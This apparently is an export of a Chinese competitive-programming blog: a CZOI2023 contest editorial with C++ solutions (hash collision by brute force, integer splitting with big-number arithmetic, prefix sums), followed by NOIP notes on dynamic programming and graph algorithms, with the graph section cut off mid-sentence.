说明\n本篇文章是举行在2023年1月17日的 CZOI2023 的题解\n\n比赛页：https://www.luogu.com.cn/contest/73174\n\nT1哈希：https://www.luogu.com.cn/problem/T254770\n\nT2拆分：https://www.luogu.com.cn/problem/T280587\n\nT3到达：https://www.luogu.com.cn/problem/T304485\n\nT4纯爱：https://www.luogu.com.cn/problem/T255743\n:::\n\n## T1 哈希\n\n看起来可能要用到一些高深的知识。实际上，观察到 mod 比较小，我们暴力枚举字符串，最多枚举（一般情况） mod 个不同的字符串，就一定可以找到产生哈希冲突的字符串了。\n\n比较关键的是枚举字符串的长度。题目中mod最大为 $3\\times 10^8$ $26^6$差不多也是这个数，所以至少要枚举6位，否则可能把所有字符串都枚举完也不能找到产生碰撞的。\n\n### 标准算法\n\n```cpp\n#include<iostream>\n#include<cstdio>\n#include<ctime>\n#include<cstdlib>\n#include<sstream>\n#define int long long\nusing namespace std;\n\nint t,base,mod,tar;\n\ninline int Hash(string str,int base,int mod){\n\tint res=0;\n\tfor(int i=0;i<str.size();i++){\n\t\tres=(res*base%mod+(int)str[i])%mod;\n\t}\n\treturn res;\n}\n\ninline void push(string x){\n\tif(Hash(x,base,mod)==tar){\n\t\tcout<<x;\n\t\texit(0);\n\t}\n}\n\nvoid dfs(string x){\n\tif(x.size()>=8) return;\n\tpush(x);\n\tfor(int i=0;i<26;i++){\n\t\tstring y=x+(char)('a'+i);\n\t\tdfs(y);\n\t}\n}\n\nsigned main(){\n\tcin>>base;cin>>mod;\n\tstring str;cin>>str;\n\ttar=Hash(str,base,mod);\n\tdfs(\"a\");\n\treturn 0;\n}\n```\n\n标程中枚举了8位字符串。由于一开始dfs时，第一位字符是固定的，所以实际上是枚举了7位。\n\n如果改为枚举7位（实际上是枚举6位），可能会将 $3\\times 10^8$ 的复杂度跑满，所以需要枚举的位数多一些，但也不能太多。\n\n时间复杂度 $O(玄学)$\n\n期望得分 $90-100pts$\n\n## T2 拆分\n\n题面非常简洁，但是确实这几道题里面最难的\n\n结合样例给的解释，我们可以很快写出一个暴力算法\n\n### 算法一\n\n```cpp\n#include<iostream>\nusing namespace std;\n\nint a[10000];\nint ans=0;\nint n;\n\nvoid dfs(int s1,int s2){\n\tif(s1==n){\n\t\tans=max(s2,ans);\n\t\treturn;\n\t}\n\n\tfor(int i=2;i<=n-s1;i++){\n\t\tdfs(s1+i,s2*i);\n\t}\n}\n\nint main(){\n\tcin>>n;\n\tdfs(0,1);\n\tcout<<ans;\n\treturn 0;\n}\n```\n\n我们观察到，题目最后的答案只和n有关，而对于测试点1-5，n最大只有50，因此我们可以打表\n\n```cpp\n#include<iostream>\nusing namespace std;\n\nint ans[51];\n\nint main(){\n\tans[1]=1;\n\tans[2]=2;\n\tans[3]=3;\n\tans[4]=4;\n\tans[5]=6;\n\tans[6]=9;\n\tans[7]=12;\n\tans[8]=18;\n\tans[9]=27;\n\tans[10]=36;\n\tans[11]=54;\n\tans[12]=81;\n\tans[13]=108;\n\tans[14]=162;\n\tans[15]=243;\n\tans[16]=324;\n\tans[17]=486;\n\tans[18]=729;\n\tans[19]=972;\n\tans[20]=1458;\n\tans[21]=2187;\n\tans[22]=2916;\n\tans[23]=4374;\n\tans[24]=6561;\n\tans[25]=8748;\n\tans[26]=13122;\n\tans[27]=19683;\n\tans[28]=26244;\n\tans[29]=39366;\n\tans[30]=59049;\n\tans[31]=78732;\n\tans[32]=118098;\n\tans[33]=177147;\n\tans[34]=236196;\n\tans[35]=354294;\n\tans[36]=531441;\n\tans[37]=708588;\n\tans[38]=1062882;\n\tans[39]=1594323;\n\tans[40]=2125764;\n\tans[41]=3188646;\n\tans[42]=4782969;\n\tans[43]=6377292;\n\tans[44]=9565938;\n\tans[45]=14348907;\n\tans[46]=19131876;\n\tans[47]=28697814;\n\tans[48]=43046721;\n\tans[49]=57395628;\n\tans[50]=86093442;\n\tint n;cin>>n;\n\tcout<<ans[n];\n\treturn 0;\n}\n```\n\n时间复杂度 O(1)\n\n期望得分 10pts\n\n对于测试点6-10，虽然n依然很小，但是暴力算法已经无法胜任。可以通过各种奇怪的剪枝、优化来获得更高的分数\n\n### 算法二\n\n我们考虑对于一个已经拆分出来的数 $a_i$，将其继续拆分会不会更优，将 $a_i$ 继续拆分为 $a_i-k$ 和 $k$，有：\n\n$$k\\times (a_i-k)\\ge a_i$$\n\n$$a_i\\ge \\frac{k^2}{k-1} $$\n\n对于不等式右边，上下同时除以 $k^2$，再令 $t=\\frac{1}{k}$ 分母可化为二次函数形式，开口朝下，有最大值，即原式有最小值4，此时 $k=2$  \n这样一来，我们得到了一个结论：对于 $a_i\\ge 4$ 有 $2\\times (a_i-2)\\ge a_i$。\n\n也就是说，一个大于等于4的数，一定可以继续被拆分。换句话说，最后拆分出来的数中，一定只会含有 1，2，3。显然，如果拆分出来了1，那么这个方案肯定不是最优的。所以最后拆分出来的数只有2和3\n\n那么对于特殊性质的测试点，我们将n全部拆成3。\n\n最后答案为 $3^{\\frac{n}{3}}$，使用快速幂\n\n```cpp\n#include<iostream>\n#define int long long\nusing namespace std;\n\nconst int mod=1000000007;\ninline int pow1(int a,int p){\n\tint res=1;\n\tdo{\n\t\tif(p&1) res=res*a%mod;\n\t\ta=a*a%mod;p>>=1;\n\t}while(p);\n\treturn res;\n}\ninline int pow2(int a,int p){\n\tint res=1;\n\tdo{\n\t\tif(p&1) res=res*a;\n\t\ta=a*a;p>>=1;\n\t}while(p);\n\treturn res;\n}\n\nsigned main(){\n\tint n,type;\n\tcin>>n>>type;\n\tif(n%3==0){\n\t\tif(type==0){\n\t\t\tcout<<pow2(3,n/3);\n\t\t}else{\n\t\t\tcout<<pow1(3,n/3);\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n时间复杂度 $O(logn)$\n\n结合算法一期望得分38pts\n\n### 算法三\n\n我们可以有一种直观的感觉：拆成的3越多越好，下面我们来证明一下  \n设一个数 $k$ 拆分成 $n$ 个2和 $m$ 个3，即有 $2n+3m=k$\n\n我们将2的数量增加 $3d$，3的数量减少$2d$。之所以这样增加和减少，是因为这样做依然可以满足 $2(n+3d)+3(m-2d)=2n+3m=k$。我们只需要证明\n\n$$2^n\\times 3^m\\ge 2^{n+3d}\\times 3^{m-2d} $$\n\n$$2^n\\times 3^m\\ge 2^n\\times 2^{3d}\\times \\frac{3^m}{3^{2d}}$$\n\n$$1\\ge \\frac{2^{3d}}{3^{2d}}=(\\frac{8}{9})^d$$\n\n即得证\n\n这样一来，我们进行分类讨论\n\n当 $n\\%3=0$ 时，答案为 $3^{\\frac{n}{3}}$\n\n当 $n\\%3=1$ 时，答案为 $3^{\\frac{n}{3}-1}\\times 2\\times 2$\n\n当 $n\\%3=2$ 时，答案为 $3^{\\frac{n}{3}}\\times 2$\n\n```cpp\n#include<iostream>\n#include<cstring>\n#define int long long\nusing namespace std;\n\nstruct Lint{\n\tint num[2000],len;\n\tchar op;\n\tLint(){memset(num,0,sizeof(num));len=1;op='+';}\n\tLint(int a){\n\t\tmemset(num,0,sizeof(num));len=1;op='+';\n\t\tint t=0;\n\t\twhile(a){\n\t\t\tt++;\n\t\t\tnum[t]=a%10;\n\t\t\ta/=10;\n\t\t}\n\t\tlen=t;\n\t}\n};\nLint operator*(Lint a,Lint b){\n\tLint c;\n\tc.len=a.len+b.len+1;\n\tfor(int i=1;i<=a.len;i++){\n\t\tfor(int j=1;j<=b.len;j++){\n\t\t\tc.num[i+j-1]+=a.num[i]*b.num[j];\n\t\t}\n\t}\n\tfor(int i=1;i<=c.len;i++){\n\t\tif(c.num[i]>=10){\n\t\t\tc.num[i+1]+=c.num[i]/10;\n\t\t\tc.num[i]%=10;\n\t\t\tc.len=max(c.len,i+1);\n\t\t}\n\t}\n\twhile(c.len>0&&!c.num[c.len]) c.len--;\n\treturn c;\n}\nLint operator/(Lint a,int b){\n\tLint c;\n\tc.len=a.len;\n\tint d=0;\n\tfor(int i=a.len;i>=1;i--){\n\t\td=d*10+a.num[i];;\n\t\tc.num[i]=d/b;\n\t\td%=b;\n\t}\n\twhile(c.len>0&&!c.num[c.len]) c.len--;\n\treturn c;\n}\nvoid print(Lint a){\n\tif(a.op=='-') cout<<\"-\";\n\tif(a.len==0) cout<<0;\n\telse{\n\t\tfor(int i=a.len;i>=1;i--){\n\t\t\tcout<<a.num[i];\n\t\t}\n\t}\n\tcout<<endl;\n}\n\nconst int mod=1000000007;\ninline int pow1(int a,int p){\n\tint res=1;\n\tdo{\n\t\tif(p&1) res=res*a%mod;\n\t\ta=a*a%mod;p>>=1;\n\t}while(p);\n\treturn res;\n}\ninline int pow2(int a,int p){\n\tint res=1;\n\tdo{\n\t\tif(p&1) res=res*a;\n\t\ta=a*a;p>>=1;\n\t}while(p);\n\treturn res;\n}\ninline Lint pow3(Lint a,Lint p){\n\tLint res(1);\n\tdo{\n\t\tif(p.num[1]&1) res=res*a;\n\t\ta=a*a;p=p/2;\n\t}while(p.len);\n\treturn res;\n}\n\nsigned main(){\n\tint n,type;\n\tcin>>n>>type;\n\tif(type==1){\n\t\tif(n%3==0){\n\t\t\tcout<<pow1(3,n/3);\n\t\t}\n\t\tif(n%3==1){\n\t\t\tcout<<pow1(3,n/3-1)*4%mod;\n\t\t}\n\t\tif(n%3==2){\n\t\t\tcout<<pow1(3,n/3)*2%mod;\n\t\t}\n\t}else{\n\t\tif(n<=50){\n\t\t\tif(n%3==0){\n\t\t\t\tcout<<pow2(3,n/3);\n\t\t\t}\n\t\t\tif(n%3==1){\n\t\t\t\tcout<<pow2(3,n/3-1)*4%mod;\n\t\t\t}\n\t\t\tif(n%3==2){\n\t\t\t\tcout<<pow2(3,n/3)*2%mod;\n\t\t\t}\n\t\t}else{\n\t\t\tif(n%3==0){\n\t\t\t\tprint(pow3(Lint(3),n/3));\n\t\t\t}\n\t\t\tif(n%3==1){\n\t\t\t\tprint(pow3(Lint(3),n/3-1)*Lint(4));\n\t\t\t}\n\t\t\tif(n%3==2){\n\t\t\t\tprint(pow3(Lint(3),n/3)*Lint(2));\n\t\t\t}\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n时间复杂度 $O(logn)$\n\n期望得分100pts\n\n值得一提的是，高精度+快速幂，而不是一个一个乘起来可以降低时间复杂度。不过本题并没有特意去卡，放开了时限\n\n快速幂时使用高精除以低精而不是高精除以高精\n\n### 另一种解法\n\n我们可以在打表的时候顺便输出最优拆分方案的方案内容，就可以发现规律\n\n这样一来这道题就成了大水题了\n\n## T3 到达\n\n::: info 说明\n本题实际上直接搬自 CSP-J 2019 纪念品，原题链接：https://www.luogu.com.cn/problem/P5662\n:::\n\n## T4 纯爱\n\n题目很长，需要理解清楚题意才能着手这道题。为了防止各位看不懂题意，出题人还在题目中加了个比较全面的例子。\n\n首先，对于一个询问天数 $t_i$，想要让Umy 完全攻略 Merry 所用的时间大于 $t_i$，由于增加的速度为 $v$，所以好感度总共至少要增加 $v_i\\times v$。没有产生矛盾的话，好感度增加 $L$ 就攻略掉了。现在多出来了至少 $v_i\\times v-L$，显然是因为产生了矛盾。因为我们要产生最少的矛盾，我们优先触发使好感度下降最多的矛盾。特判 $v_i\\times v-L＜0$ 的情况。\n\n### 算法一\n\n```cpp\n#include<iostream>\n#include<algorithm>\n#include<cstdio>\n#define int long long\nusing namespace std;\n\ninline int read(){\n\tint res=0,ch=getchar(),f=1;\n\twhile(!isdigit(ch) and ch!=EOF){\n\t\tif(ch=='-') f=-1;\n\t\tch=getchar();\n\t}\n\twhile(isdigit(ch)){\n\t\tres=(res<<3)+(res<<1)+(ch-'0');\n\t\tch=getchar();\n\t}\n\treturn res*f;\n}\n\nint n,L,v;\nint a[2000010];\n\nsigned main(){\n\tn=read(),L=read(),v=read();\n\tfor(int i=1;i<=n;i++){\n\t\tint x=read(),y=read();\n\t\ta[i]=x-y;\n\t}\n\tsort(a+1,a+n+1,[](int x,int y){\n\t\treturn x>y;\n\t});\n\tint q=read();\n\twhile(q--){\n\t\tint t=read();\n\t\tt=t*v-L;\n\t\tif (t<0){\n\t\t\tprintf(\"0\\n\");\n\t\t}else{\n\t\t\tint ans=0;\n\t\t\tfor(int i=1;i<=n;i++){\n\t\t\t\tt-=a[i];\n\t\t\t\tans++;\n\t\t\t\tif(t<0) break;\n\t\t\t}\n\t\t\tif(t>=0) printf(\"kdl\\n\");\n\t\t\telse printf(\"%lld\\n\",ans);\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n时间复杂度 $O(nlogn+qn)$\n\n期望得分50pts\n\n### 算法二\n\n考虑进一步优化。\n\n我们发现，对于每个询问，我们都是从前往后去一个一个减处理出来的 $a[i]$ ，中间做了许多重复操作。\n\n我们使用前缀和优化，令 $s[i]=a[i]+s[i-1]$ 。这样，我们只需要找到第一个大于 $v_i\\times v-L$ 的 $s[]$ 即可\n\n```cpp\n#include<iostream>\n#include<algorithm>\n#include<cstdio>\n#define int long long\nusing namespace std;\n\ninline int read(){\n\tint res=0,ch=getchar(),f=1;\n\twhile(!isdigit(ch) and ch!=EOF){\n\t\tif(ch=='-') f=-1;\n\t\tch=getchar();\n\t}\n\twhile(isdigit(ch)){\n\t\tres=(res<<3)+(res<<1)+(ch-'0');\n\t\tch=getchar();\n\t}\n\treturn res*f;\n}\n\nint n,L,v;\nint a[2000010],s[2000010];\n\nsigned main(){\n\tn=read(),L=read(),v=read();\n\tfor(int i=1;i<=n;i++){\n\t\tint x=read(),y=read();\n\t\ta[i]=x-y;\n\t}\n\tsort(a+1,a+n+1,[](int x,int y){\n\t\treturn x>y;\n\t});\n\tfor(int i=1;i<=n;i++){\n\t\ts[i]=a[i]+s[i-1];\n\t}\n\tint q=read();\n\twhile(q--){\n\t\tint t=read();\n\t\tt=t*v-L;\n\t\tif (t<0)\n\t\t\tprintf(\"0\\n\");\n\t\telse if (s[n]>t)\n\t\t\tprintf(\"%lld\\n\",upper_bound(s+1,s+n+1,t)-s);\n\t\telse\n\t\t\tprintf(\"kdl\\n\");\n\t}\n\treturn 0;\n}\n```\n\n时间复杂度 $O((n+q)logn)$\n\n期望得分100pts\n\n注意，需要开long long，否则测试点#6和#7会wa。另外本题还需要快读或者cin/cout关闭流同步，否则最后三个测试点会tle\n\n","summary":"本篇文章是举行在2023年1月17日的 CZOI2023 的题解","key":["czoi"],"tags":[],"path":["算法竞赛","CZOI","CZOI2023题解.md"],"background":"https://pic.caiwen.work/i/2025/01/22/67909e51b8f1c.jpg","recommend":false,"status":"published"},{"type":"Article","title":"DP","id":"noip-dp","createTime":"2022-10-25T02:27:00.000Z","updateTime":"2025-09-05T13:34:05.764Z","content":"\n## 背包dp\n\n### 01背包\n\n（1）枚举物品 $i$\n\n（2）倒叙枚举体积 $j$\n\n（3）$dp[j]=max(dp[j],dp[i-v[i]]+w[i])$\n\n### 完全背包\n\n同上，倒叙枚举变为正序枚举\n\n### 多重背包\n\n二进制拆分\n\n将一个数拆分成 1、2、4、8...，这样的拆分满足拆分出来的数相互加可以加出从1到n之间的所有数的性质\n\n```cpp\n\tfor(int i=1;i<=n;i++){\n\t\tint vi,wi,si;\n\t\tcin>>vi>>wi>>si;\n\t\tfor(int j=1;j<=si;j<<=1){\n\t\t\tsi-=j;\n\t\t\tint n_vi=j*vi,n_wi=j*wi;\n\t\t\tfor(int k=v;k>=n_vi;k--){\n\t\t\t\tdp[k]=max(dp[k],dp[k-n_vi]+n_wi);\n\t\t\t}\n\t\t}\n\t\tif(si){\n\t\t\tint n_vi=si*vi,n_wi=si*wi;\n\t\t\tfor(int k=v;k>=n_vi;k--){\n\t\t\t\tdp[k]=max(dp[k],dp[k-n_vi]+n_wi);\n\t\t\t}\n\t\t}\n\t}\n```\n\n### 混合背包\n\n在枚举物品之后，根据物品类型进行相应的转移即可\n\n### 二维费用背包\n\n多循环一层即可\n\n### 分组背包\n\n先枚举组别，再枚举体积，再枚举物品\n\n### 树形背包\n\n物品之间的关系用森林表示，就需要用树形背包\n\n首先可以建立一个超级源点，将森林转化为一个树\n\n状态 $dp[x][k]$ 表示以x为根的子树，选择了k个点（包括根节点）的最大价值\n\n对于每个点，初始化 $dp[x][0]=0$，对于其他状态，$dp[x][i]=负无穷$  \n首先枚遍历子节点，对于每个子节点，倒序枚举当前节点的容量，然后再枚举这个子节点选了多少个点\n\n```cpp\ndp[x][0]=0;\nfor(int i=0;i<ve[x].size();i++){\n\tint to=ve[x][i];\n\tdfs(to);\n\tfor(int j=n;j>=0;j--){\n\t\tfor(int k=0;k<=j;k++){\n\t\t\tdp[x][j]=max(dp[x][j],dp[x][j-k]+dp[to][k]);\n\t\t}\n\t}\n}\n```\n\n遍历子节点时，就相当于枚举了一个物品，然后倒序枚举体积，就相当于一个01背包。而子节点的价值会随着分配给节点的体积改变而改变，相当于泛化物品。**在最内层枚举这个分配给这个子节点分配的容量**\n\n值得注意的是，根节点本身也算一个物品，而上述代码并没有考虑这一点，所以我们需要修正\n\n```cpp\nif(x!=0){\n\tfor(int i=n;i>=0;i--){\n\t\tdp[x][i]=dp[x][i-1]+w[x];\n\t}\n}\n```\n\n## 换根dp\n\n先选择第一个点进行dp。然后再进行一个dfs，进行换根\n\n换根的时候，需要用父节点的答案去推得子节点的答案。具体的：对于 $u->v$ ，首先在u节点答案的基础上，减去v节点对其的贡献，然后考虑u节点剩余答案如何贡献v节点的答案\n\n示例\n\n```cpp\nvoid dfs2(int x,int fa){\n\tfor(int i=head[x];i;i=edge[i].next){\n\t\tint to=edge[i].to;\n\t\tif(to==fa) continue;\n\t\tint u=dp[x],v=dp[to];\n\t\tif(v>0) u-=v;//消除v对u的贡献\n\t\tif(u>0) v+=u;//考虑剩余u对v的贡献\n\t\tdp[to]=ans[to]=v;\n\t\tdfs2(to,x);\n\t}\n}\n```\n\n## 数位dp\n\n状态一般为 $dp[pos][其他需要记录的][lim][zero]$\n\n求指定区间内满足某一条件的数的个数，采用前缀和思想\n\n```cpp\nwork(b)-work(a-1)\n```\n\n首先需要把数字按位拆开\n\n```cpp\nint work(int x,int d){\n\tmemset(dp,-1,sizeof(dp));\n\tint len=0;\n\tdo{\n      //值得注意的是，如果是其他进制下的数位dp，下面的10需要改成相应的进制\n\t\tnum[++len]=x%10;\n\t\tx/=10;\n\t}while(x);\n  //从最高位枚举，一开始就有lim限制\n\tint ans=dfs(len,0,true,true);\n\tfor(int i=len-1;i>=1;i--){\n      //高位上面补0，就没有lim限制了\n\t\tans+=dfs(i,0,false,true);\n\t}\n  //都有zero限制\n\treturn ans;\n}\n```\n\n记忆化搜索的过程大致如下\n\n```cpp\nint dfs(int pos,int cnt,bool lim,bool zero){\n\tint &tmp=dp[pos][cnt][lim][zero];\n\tif(tmp!=-1) return tmp;\n\tif(pos==0) return tmp=cnt;\n\n\ttmp=0;\n\tint maxn=lim? num[pos]:9;\n\tint minn=zero? 1:0;\n\tfor(int i=minn;i<=maxn;i++){\n\t\ttmp+=dfs(pos-1,cnt+(i==d),lim&&(i==maxn),false);\n\t}\n\n\treturn tmp;\n}\n```\n\n## 概率dp\n\n先找到概率为1的状态u，然后据此考虑转移方程\n\nHDU4576 通过取模来解决环状的问题。看似转移循序无序，实际上可以根据指令的先后顺序作为dp的转移顺序。使用0/1滚动数组来优化\n\nPOJ3744 有很多概率为1的状态，转移并不是很顺利，所以可以考虑分段，在使用乘法法则求出最终概率\n\n## 期望dp\n\n通过dp、排列组合等计算概率，然后概率乘转移产生贡献（天数+1等）来计算出期望\n\n转移顺序经常是倒推的，因为我们往往知道dp终点的期望而要求dp起点的期望\n\nPOJ2096\n\n### 状态转移时的依赖\n\n#### 对单个状态的依赖\n\nZOJ3329 在状态转移时发现所有的状态的转移都需要依赖 $dp[0]$ 这个状态。而 $dp[0]$ 恰好又是我们想求的。对于这种依赖单个状态，可以将依赖的状态视为未知数，转移时只看系数，最后再解方程\n\nHDU4035 树上的依赖，一个点转移时，依赖于父节点和子节点和根节点（题目要求），而父节点和子节点转移时也会依赖自己，根节点也会依赖于这些点。对此，先从叶子节点下手，叶子节点仅依赖与父节点和根节点。通过方程的代入化简可以使得非叶子节点也仅对父节点和根节点形成依赖。实际上，这就是上面那个题目的有两个未知数的版本。转移时只需考虑系数即可，最终在根节点上解方程\n\n#### 循环依赖\n\nHDU4089 状态转移时，后一个状态依赖于前一个状态，而第一个状态又依赖于最后的状态，循环依赖。对此，可以通过累加、代入的方法将中间的状态全部消掉，最后得到之后一个状态的方程，把第一个或最后一个状态的值解出来，这样循环就被打破\n\n#### 高斯消元\n\n未完待续...\n\n## 基环树\n\n基环树的处理方法有暴力去掉环上一边然后dfs，还有基环树dp  \n基环树的每个联通块中有且仅有一个环\n\n首先先进行一个拓扑排序\n\n```cpp\nvoid topo(){\n\tqueue<int> q;\n\tfor(int i=1;i<=n;i++){\n\t\tif(in[i]==1) q.push(i);\n\t}\n\twhile(!q.empty()){\n\t\tint now=q.front();q.pop();\n\t\tfor(int i=head[now];i;i=edge[i].next){\n\t\t\tint to=edge[i].to;\n\t\t\tif(in[to]>1){\n\t\t\t\tin[to]--;\n\t\t\t\tif(in[to]==1) q.push(to);\n\t\t\t}\n\t\t}\n\t}\n}\n```\n\n然后找环上的点，找到了环上的一点就可以顺着把环上的所有的点都找出来。\n\n```cpp\nfor(int i=1;i<=n;i++){\n    if(in[i]<2||vis[i]) continue;\n    memset(loop,0,sizeof(loop));\n\tmemset(g,0,sizeof(g));\n    cnt=0;\n\tfind(i);\n    ...\n}\n```\n\nfind\n\n```cpp\nvoid find(int x){\n\tvis[x]=true;\n\tloop[++cnt]=x;\n\tfor(int i=head[x];i;i=edge[i].next){\n\t\tint to=edge[i].to;\n\t\tif(in[to]<2||vis[to]) continue;\n\t\tfind(to);\n\t}\n}\n```\n\n然后先把环上节点的子树进行dp\n\n```cpp\nfor(int j=1;j<=cnt;j++){\n\tdp(loop[j]);\n}\n```\n\n设 $g[x][0/1][0/1]$ 表示dp到了第x个节点，第x个节点选/不选，第1个节点选/不选\n\n首先分两类：第一个节点选/不选\n\n1. 第一个节点不选，那么初始化第二个节点的信息\n\n```cpp\ng[2][1][0]=f[loop[1]][0]+f[loop[2]][1];\ng[2][0][0]=f[loop[1]][0]+f[loop[2]][0];\nfor(int i=3;i<=cnt;i++){\n\tg[i][0][0]=max(g[i-1][1][0],g[i-1][0][0])+f[loop[i]][0];\n\tg[i][1][0]=g[i-1][0][0]+f[loop[i]][1];\n}\n```\n\n2. 第一个节点选，那么初始化第二个和第三个节点的信息。第二个节点肯定不选。\n\n```cpp\ng[2][0][1]=f[loop[1]][1]+f[loop[2]][0];\ng[3][0][1]=f[loop[1]][1]+f[loop[2]][0]+f[loop[3]][0];\ng[3][1][1]=f[loop[1]][1]+f[loop[2]][0]+f[loop[3]][1];\nfor(int i=4;i<=cnt;i++){\n\tg[i][0][1]=max(g[i-1][1][1],g[i-1][0][1])+f[loop[i]][0];\n\tg[i][1][1]=g[i-1][0][1]+f[loop[i]][1];\n}\n```\n\n最后总结答案\n\n```cpp\nans+=max(max(g[cnt][1][0],g[cnt][0][0]),g[cnt][0][1]);\n```\n\n","summary":"noip提高级范围内的dp算法知识点和模板，自用。","key":["noip","模板","dp"],"tags":[{"value":"自用","color":"primary"}],"path":["算法竞赛","板子","noip","DP.md"],"background":"https://www.caiwen.work/wp-content/uploads/2022/10/QQ截图20221121124101.png","recommend":false,"status":"discard"},{"type":"Article","title":"图论","id":"noip-tulun","createTime":"2022-10-21T15:52:00.000Z","updateTime":"2025-09-05T13:34:05.710Z","content":"\n## floyd算法\n\n### 最短路\n\nfloyd算法适用于多源最短路\n\n```cpp\nfor(int k=1;k<=n;k++){\n\tfor(int i=1;i<=n;i++){\n\t\tfor(int j=1;j<=n;j++){\n\t\t\tdis[i][j]=min(dis[i][j],dis[i][k]+dis[k][j]);\n\t\t}\n\t}\n}\n```\n\n值得一提的是，如果有一条边的边权更新，那么会出现下面两种情况：\n\n1. 边权变小，那么只需要以边上两端点为中继点跑floyd（因为如果存在两点之间的最短路变小了，那么这个最短路一定过了这条边）\n\n2. 边权变大，需要重新跑整个的floyd（因为原来的最短路被破坏）\n\n### 传递闭包\n\n使用floyd可以判断两点是否连通（主要是单向连通，可能会有A能到B，B不能到A的情况）（这种单向连通关系为不等式提供了很好的条件）\n\n这种情况下的$dis[][]$的含义发生变化，$dis[][]=1$说明可以到达，$dis[][]=0$ 说明不能到达。据此我们有\n\n```cpp\nfor(int k=1;k<=n;k++){\n\tfor(int i=1;i<=n;i++){\n\t\tfor(int j=1;j<=n;j++){\n\t\t\tdis[i][j]=max(dis[i][j],dis[i][k]&&dis[k][j]);\n\t\t}\n\t}\n}\n```\n\n例题：AcWing 343\n\n### 无向图最小环\n\n#### 求权值\n\n枚举中间点k。此时前k-1的点之间的最短路关系已经求出，我们可以有环$dis[i][j]+a[k][i]+a[k][j]$\n\n枚举完环再去求最短路\n\n```cpp\nlong long ans=0x3f3f3f3f;\nfor(int k=1;k<=n;k++){\n\tfor(int i=1;i<k;i++){\n\t\tfor(int j=i+1;j<k;j++){\n\t\t\tans=min(ans,(long long)dis[i][j]+a[i][k]+a[k][j]);\n\t\t}\n\t}\n\tfor(int i=1;i<=n;i++){\n\t\tfor(int j=1;j<=n;j++){\n\t\t\tdis[i][j]=dis[j][i]=min(dis[i][j],dis[i][k]+dis[k][j]);\n\t\t}\n\t}\n}\n```\n\n有两个注意点\n\n1. 由于最后的ans是三个变量相加，可能有爆int的风险，所以ans变量需要是long long类型。不能直接 `#define int long long` 因为三个long long相加会爆long long\n\n2. 存图的时候需要注意，有可能有重边！\n\n#### 求路径\n\n对于每一个最短路，我们都记录这两个点之间的最短路是由哪个中继点中继来的。然后dfs输出路径\n\n```cpp\nint mid[101][101];//记录两点之间最短路是哪个中继点中继过来的\nvector<int> path;//最后要输出的答案\nvoid dfs(int a,int b){\n\tint k=mid[a][b];\n\tif(k==0) return;\n\tdfs(a,k);\n\tpath.push_back(k);\n\tdfs(k,b);\n}\ninline void push(int i,int j,int k){\n\tpath.clear();\n\tpath.push_back(k);\n\tpath.push_back(i);\n\tdfs(i,j);\n\tpath.push_back(j);\n}\n```\n\nfloyd部分类似\n\n```cpp\nlong long ans=0x3f3f3f3f;\nfor(int k=1;k<=n;k++){\n\tfor(int i=1;i<k;i++){\n\t\tfor(int j=i+1;j<k;j++){\n\t\t\tif(ans>(long long)dis[i][j]+a[i][k]+a[k][j]){\n\t\t\t\tans=dis[i][j]+a[i][k]+a[k][j];\n\t\t\t\tpush(i,j,k);\n\t\t\t}\n\t\t}\n\t}\n\tfor(int i=1;i<=n;i++){\n\t\tfor(int j=1;j<=n;j++){\n\t\t\tif(dis[i][j]>dis[i][k]+dis[k][j]){\n\t\t\t\tdis[i][j]=dis[j][i]=dis[i][k]+dis[k][j];\n\t\t\t\tmid[j][i]=mid[i][j]=k;\n\t\t\t}\n\t\t}\n\t}\n}\n```\n\n## dijkstra算法\n\ndijkstra算法求最短路只适用于边权都为正数的情况。有负边权，则需要使用spfa算法\n\n和prim算法类似，都需要vis数组来记录点是否进入过队列\n\n```cpp\ntypedef pair<int,int> pii;\nint dis[100005];\nint vis[100005];\nvoid dijkstra(int x){\n\tmemset(dis,0x3f,sizeof(dis));\n\tdis[x]=0;\n\tpriority_queue<pii,vector<pii>,greater<pii> > q;\n\tq.push(make_pair(0,x));\n\twhile(!q.empty()){\n\t\tint now=q.top().second;q.pop();\n\t\tif(vis[now]) continue;\n\t\tvis[now]=true;\n\t\tfor(int i=head[now];i;i=edge[i].next){\n\t\t\tint to=edge[i].to;\n\t\t\tint w=edge[i].w;\n\t\t\tif(dis[to]>dis[now]+w){\n\t\t\t\tdis[to]=dis[now]+w;\n\t\t\t\tif(!vis[to]){\n\t\t\t\t\tq.push(make_pair(dis[to],to));\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}\n```\n\n### 最短路计数\n\n设 $num[x]$ 表示以点x结尾的最短路的数量  \n初始化有 $num[s]=1$\n\n松弛成功时，有 $num[to]=num[now]$  \n$dis[to]=dis[now]+w$时，有 $num[to]+=num[now]$\n\n### 分层图最短路\n\n如果最短路过程中涉及到了状态转移（类似dp那种），则需要用到分层图最短路\n\n例如求源点到其他点的最短路，其中可以有 $k$ 条边的长度视为 $0$。\n\n$dis[x][k]$ 表示到 $x$ 点，已经用了 $k$ 次无视长度的机会\n\n注意 vis 数组也要附加一维状态\n\n初始化 $dis[s][0]=0$\n\n在堆中维护的元素需要有三个属性：最短路长度，节点编号，用了多少次无视长度的机会\n\n松弛时，存在两个状态转移，使用无视长度的机会还是不使用\n\n```cpp\nint vis[10004][11],dis[10004][11];\nvoid dijkstra(){\n\tmemset(dis,0x3f,sizeof(dis));\n\tdis[s][0]=0;\n\tpriority_queue<pii> q;\n\tq.push(pii(s,0,0));\n\twhile(!q.empty()){\n\t\tpii tmp=q.top();\n\t\tq.pop();\n\t\tint now=tmp.u;\n\t\tint cnt=tmp.cnt;\n\t\tif(vis[now][cnt]) continue;\n\t\tvis[now][cnt]=true;\n\t\tfor(int i=head[now];i;i=edge[i].next){\n\t\t\tint to=edge[i].to;\n\t\t\tint w=edge[i].w;\n\t\t\tif(cnt<k&&dis[now][cnt]<dis[to][cnt+1]){\n\t\t\t\tdis[to][cnt+1]=dis[now][cnt];\n\t\t\t\tq.push(pii(to,dis[to][cnt+1],cnt+1));\n\t\t\t}\n\t\t\tif(dis[now][cnt]+w<dis[to][cnt]){\n\t\t\t\tdis[to][cnt]=dis[now][cnt]+w;\n\t\t\t\tq.push(pii(to,dis[to][cnt],cnt));\n\t\t\t}\n\t\t}\n\t}\n}\n```\n\n### 次短路\n\n设 $dis1[]$ 为到当前点的最短路，$dis2[]$ 为到当前点的次短路  \n对于边 $(u,v,w)$ 转移的时候就有：\n\n如果 